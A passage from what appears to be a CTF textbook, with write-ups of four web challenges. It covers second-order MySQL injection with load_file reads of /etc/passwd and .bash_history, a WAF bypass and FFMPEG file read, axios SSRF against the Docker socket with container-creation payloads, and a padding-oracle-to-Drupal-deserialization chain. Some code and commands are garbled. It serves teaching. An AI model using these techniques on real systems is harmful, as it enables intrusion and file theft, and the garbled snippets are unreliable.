### 1.3.3.9 Comment (NetDing Cup 2018 Online)

**Introduction:**
The challenge begins with a login page, as shown in Figure 1.84. Upon examining the challenge website, it is discovered that there is a `.git` directory. The source code can be restored using the GitHack tool, and the restored code can be audited. A secondary injection vulnerability is found, as illustrated in Figure 1.85.

**Figure 1.84: Login Form**

```plaintext
Sign in
zhangwei
zhangwej**
Signin
```

**Figure 1.85: Source Code Snippet**

```php
$bo_id = addslashes($_POST['bo_id']);
$sql = "select category from board where ida*$bo_id*";
$result = mysql_query($sql);
$num = mysql_num_rows($result);

if ($num > 0) {
    $category = mysql_result($result, 0, 'category');
    $content = addslashes($_POST['content']);
    // Further processing...
}
```

**Difficulty:** Moderate

**Knowledge Points:**
- Source code leakage due to an undeleted `.git` directory.
- Secondary injection (MySQL).
- Reading file content through an injection vulnerability (e.g., `load_file`).

**Solution:**
- Use BurpSuite’s Intruder module to brute force the three bytes after the password, as shown in Figure 1.86.
- Restore the application source code from the leaked `.git` directory and audit it to find SQL injection (secondary injection).
- Exploit the injection vulnerability to read the `/etc/passwd` file using `load_file`.
- From the `/etc/passwd` file, identify the user `www` and its working directory: `/home/www/`.
- Read the `/home/www/.bash_history` file to find the server's history commands:
  ```sh
  cd /tmp/
  rm -f html.zip
  unzip html.zip
  /AAA/xe△/twu x-do
  /tuaq/nnn/xea/ po
  service apache2 start
  rm -f .DS_Store
  ```
- Use the information from the `.bash_history` file to read `/tmp/.DS_Store` and find the flag file `flag_8946e1fflee3e40f.php`. Note that the `load_file` result needs to be encoded, such as using MySQL's `hex` function.

**Summary:**
This challenge involves a typical file reading and exploitation chain. After exploiting the MySQL injection, more directory information is leaked through the `.bash_history` file, and other files are read based on the collected information.

---

### 1.3.3.10 The Ark Project (CISCN 2017)

**Introduction:**
The challenge includes registration and login functionalities. After logging in with the administrator account, users can upload AVI files, which are automatically converted to MP4 files.

**Difficulty:** Easy

**Knowledge Points:**
- Bypassing SQL injection WAF using inline comments.
- Exploiting an FFMPEG vulnerability to read arbitrary files.

**Solution:**
- Test for SQL injection vulnerabilities through black-box testing.
- Use inline comments to bypass the WAF (e.g., `/*150001select*/`), as shown in Figure 1.87.
- Continue to exploit the injection vulnerability to obtain the administrator account, encrypted password, and encryption key (st_key). Decrypt the plaintext password using AES.
- Log in with the injected username and password to access the administrator account and find the video format conversion function.
- Generate a malicious AVI file using a known exploit script and upload it.
- Download the converted video and play it to read the content of the `/etc/passwd` file, as shown in Figure 1.88.
- From the `/etc/passwd` file, identify the user `s0m3body` and guess that the flag is in their user directory: `/home/s0m3b0dy/flag.txt`.
- Use the FFMPEG file reading vulnerability to read the flag, as shown in Figure 1.89.

**Summary:**
- This challenge demonstrates a typical method of bypassing SQL injection WAF using inline comments.
- It also highlights a novel and interesting way to present the results of reading files, leveraging the FFMPEG arbitrary file reading vulnerability via the HLS (HTTP Live Streaming) protocol, which supports the File protocol.

---

### 1.3.3.11 PrintMD (RealWorldCTF 2018 Online)

**Introduction:**
The challenge provides a function to render the content of an online Markdown editor (hackmd) into a printable form. The rendering methods include client-side local rendering and server-side remote rendering.

**Server-Side Remote Rendering Code:**

```javascript
const { matchesUA } = require('browserslist-useragent');
const router = Router();
const axios = require('axios');
const md = require('./../plugins/md_srv');

router.post('/render', function (req, res, next) {
    let ret = {};
    const browsers = ["last 1 version", "> 1%", "IE 10"];
    const allowHigherVersions = true;

    ret.ssr = matchesUA(req.body.ua, { browsers, allowHigherVersions });

    if (ret.ssr) {
        axios.get(req.body.url).then(r => {
            ret.mdbody = md.render(r.data);
        });
    } else {
        ret.mdbody = md.render("# Please wait...");
    }

    res.json(ret);
});

module.exports = router;
```

**Docker Environment:**
- The Docker service is running on the server.
- The path to the flag on the server is `/flag`.

**Difficulty:** Difficult

**Knowledge Points:**
- JavaScript prototype pollution.
- Axios SSRF (UNIX Socket) attack on the Docker API to read local files.

**Solution:**
- Audit the client-side code obfuscated by Webpack and de-obfuscate it.
- Identify the logic related to server-side communication in the application.
- Use HTTP parameter pollution to bypass the `startsWith` restriction and prototype pollution on `req.body.url` to pass the `socketPath` and `url` parameters to Axios.
- Exploit the SSRF vulnerability to attack the Docker API, pull the flag into the Docker container, and read the files in the Docker.

**Attack Process:**
1. Pull a lightweight image:
   ```sh
   docker pull alpine:latest
   qsod= [poq4ow] [.xn
   &url[url]=http://127.0.0.1/images/create?fromImage=alpine:latest
   &url=https://hackmd.io/aaa
   &url[socketPath]=/var/run/docker.sock
   ```

2. Create a container:
   ```sh
   docker create -v /flag:/flagindocker alpine -entrypoint /bin/sh -name ctf alpine:latest
   qsod= [poqaw] [xn
   &url[url]=http://127.0.0.1/containers/create?name=ctf
   &url[data][Image]=alpine:latest
   &url[data][Volumes][flag][path]=/flagindocker
   &url[data][Binds][]=/flag:/flagindocker:ro
   &url[socketPath]=/var/run/docker.sock
   &url=https://hackmd.io/aaa
   ```

3. Start the container:
   ```sh
   docker start ctf
   url[method]=post
   &url[url]=http://127.0.0.1/containers/ctf/start
   &url[socketPath]=/var/run/docker.sock
   &url=https://hackmd.io/aaa
   ```

4. Retrieve the flag file in the Docker container:
   ```sh
   url[method]=get
   &url[url]=http://127.0.0.1/containers/ctf/archive?path=/flagindocker
   &url[socketPath]=/var/run/docker.sock
   &url=https://hackmd.io/aaa
   ```

**Summary:**
- The challenge is intricate and novel, requiring the use of SSRF to control other applications on the server to read files, as Axios does not support the File protocol.
- Similar to the Axios module, the curl component can also perform UNIX Socket communication.

---

### 1.3.3.12 The Careless Jia Jia (PWNHUB)

**Introduction:**
The challenge starts with a Drupal service. Information gathering reveals that an FTP service is open on port 23 of the server, and the FTP service has a weak password. After logging in with the weak password, it is found that the FTP directory contains Drupal plugin source code, which has a SQL injection vulnerability. Additionally, there is a Windows computer in the intranet with port 80 (Web service) open.

**Difficulty:** Moderate

**Knowledge Points:**
- Padding Oracle Attack.
- Drupal 8.x Deserialization Vulnerability.
- Special Exploitation Techniques for Windows PHP Local File Inclusion/Reading.

**Solution:**
- Bruteforce the FTP login password and discover a weak login password.
- Audit the downloaded plugin source code and find a SQL injection vulnerability. However, user input needs to be decrypted in AES-CBC mode before being used in SQL statements.

**Decryption Function:**

```php
private function set_decrypt($id) {
    if ($c = Base64decode(Base64decode($id))) {
        if ($iv = substr($c, 0, 16)) {
            if ($pass = substr($c, 17)) {
                if ($d = openssl_decrypt($pass, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv)) {
                    return $d;
                } else {
                    die("hacker?");
                }
            }
            return 1;
        }
        return 1;
    }
    return 1;
}
```

**SQL Injection Exploitation:**

```php
public function get_by_id(Request $request) {
    $nid = $request->get('id');
    $nid = $this->set_decrypt($nid);
    $this->waf($nid);
    $query = db_query("SELECT nid, title, body_value FROM node_field_data LEFT JOIN node__body ON node_field_data.nid=node_body.entity_id WHERE nid = :nid", array(':nid' => $nid))->fetchAssoc();
    return array('#title' => $this->t($query['title']), '#markup' => $this->t($query['body_value']));
}
```

- By auditing the encryption process, it is found that the plaintext of the SQL injection statement can be forged using a padding oracle attack, as shown in Figure 1.91.
- Exploit the SQL injection vulnerability to retrieve the user's email and password, as shown in Figure 1.92.
- Use the mailbox information to log in and find the leaked online document address in the mailbox. Open the document to restore the historical version and find the admin password.
- Use the recovered admin password to log in to the Drupal admin system, determine the corresponding Drupal version, and find a deserialization vulnerability.
- Construct a deserialized payload to execute the `phpinfo` function, as shown in Figure 1.93.
- After gaining arbitrary code execution, scan the intranet and find a Windows host with a web service that includes a file reading vulnerability.
- Test and find a WAF that blocks files with dangerous filenames. Use `**` as a regular wildcard to bypass the WAF, as shown in Figure 1.94.

**Summary:**
- The challenge involves a complex series of steps, including a padding oracle attack, SQL injection, and deserialization vulnerability exploitation.
- The final step involves scanning the intranet and finding a Windows host with a web service that includes a file reading vulnerability.